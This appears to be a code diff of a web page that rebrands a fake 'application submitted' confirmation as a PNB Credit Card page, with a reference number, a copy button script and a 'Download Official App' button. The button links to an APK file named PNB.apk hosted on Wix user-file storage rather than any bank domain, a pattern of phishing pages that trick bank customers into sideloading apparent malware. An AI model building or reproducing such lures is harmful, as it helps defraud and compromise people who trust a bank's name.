@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Submitted | Premium Card</title>
+    <title>Submitted | PNB Credit Card</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -43,7 +43,6 @@
         h2 { font-size: 22px; margin-bottom: 10px; margin-top: 0; }
         p { color: #666; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
         
-        /* रेफरेंस नंबर बॉक्स */
         .ref-box {
             border: 2px dashed #ffeef2;
             background-color: #fff9fa;
@@ -68,7 +67,6 @@
             cursor: pointer;
         }
 
-        /* What's Next बॉक्स */
         .next-box {
             background-color: #f8fafc;
             border: 1px solid #e2e8f0;
@@ -81,7 +79,6 @@
         .next-box ul { margin: 0; padding-left: 20px; font-size: 13px; color: #475569; }
         .next-box li { margin-bottom: 8px; }
 
-        /* डाउनलोड बटन स्टाइल */
         .download-btn {
             background-color: #0f172a;
             color: white;
@@ -98,7 +95,7 @@
 </head>
 <body>
 
-    <div class="header">PREMIUM CARD</div>
+    <div class="header">PNB Credit Card</div>
 
     <div class="success-container">
         <div class="success-icon">✓</div>
@@ -109,12 +106,20 @@
         <div class="ref-box">
             <div class="ref-text">
                 <div>REFERENCE NO.</div>
-                <code>APPE32143CF</code>
+                <code id="refCode">APPE32143CF</code>
             </div>
-            <button class="copy-btn">Copy</button>
+            <button class="copy-btn" id="copyBtn">Copy</button>
         </div>
 
         <!-- आगे क्या होगा -->
+        .next-box {
+            background-color: #f8fafc;
+            border: 1px solid #e2e8f0;
+            border-radius: 12px;
+            padding: 15px;
+            text-align: left;
+            margin-bottom: 25px;
+        }
         <div class="next-box">
             <h4>WHAT'S NEXT</h4>
             <ul>
@@ -124,12 +129,33 @@
             </ul>
         </div>
 
-        <!-- डाउनलोड बटन (यहाँ अपना लिंक डालें) -->
-        <a href="https://download-files.wixmp.com/archives/d6f60e_7d742b94fb604eb8b9becddb54cdc04e.apk?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJvYmoiOltbeyJwYXRoIjoiL2FyY2hpdmVzL2Q2ZjYwZV83ZDc0MmI5NGZiNjA0ZWI4YjliZWNkZGI1NGNkYzA0ZS5hcGsifV1dLCJkaXMiOnsiZmlsZW5hbWUiOiJQTkIuYXBrIiwidHlwZSI6ImF0dGFjaG1lbnQifSwiYXVkIjpbInVybjpzZXJ2aWNlOmZpbGUuZG93bmxvYWQiXSwiZXhwIjoxNzkzNDQwMzI5LCJqdGkiOiJlOWViOGVjYS1jMTU3LTRhNTEtOTFmYS1iYzRiZDBiMGQzMDUiLCJpYXQiOjE3OTM0MzY3MjksImlzcyI6InVybjphcHA6ZTY2NjMwZTcxNGYwNDkwYWFlYTFmMTQ5YjNiNjllMzIiLCJzdWIiOiJ1cm46YXBwOmU2NjYzMGU3MTRmMDQ5MGFhZWExZjE0OWIzYjY5ZTMyIn0.stXxztRLGBZZgCJ-VvpmqVhMndMK_WeXE1ENAryKVxM&fileUsed=false" style="text-decoration: none;">
+        <!-- डाउनलोड बटन (नया डायरेक्ट लिंक) -->
+        <a href="https://d6f60e32-d39f-4fef-8d8c-6d1f42f6fac9.usrfiles.com/archives/d6f60e_7d742b94fb604eb8b9becddb54cdc04e.apk" style="text-decoration: none;">
             <button class="download-btn">📥 Download Official App</button>
         </a>
         <span style="display: block; font-size: 11px; color: gray;">Install the official app to track your application.</span>
     </div>
 
+    <!-- Copy Functionality Script -->
+    <script>
+        const copyBtn = document.getElementById('copyBtn');
+        const refCode = document.getElementById('refCode');
+
+        copyBtn.addEventListener('click', function() {
+            navigator.clipboard.writeText(refCode.innerText).then(() => {
+                copyBtn.innerText = 'Copied!';
+                copyBtn.style.backgroundColor = '#10b981';
+                copyBtn.style.color = 'white';
+                
+                setTimeout(() => {
+                    copyBtn.innerText = 'Copy';
+                    copyBtn.style.backgroundColor = '#ffeef2';
+                    copyBtn.style.color = '#7a0c24';
+                }, 2000);
+            }).catch(err => {
+                alert('Failed to copy text.');
+            });
+        });
+    </script>
 </body>
 </html>
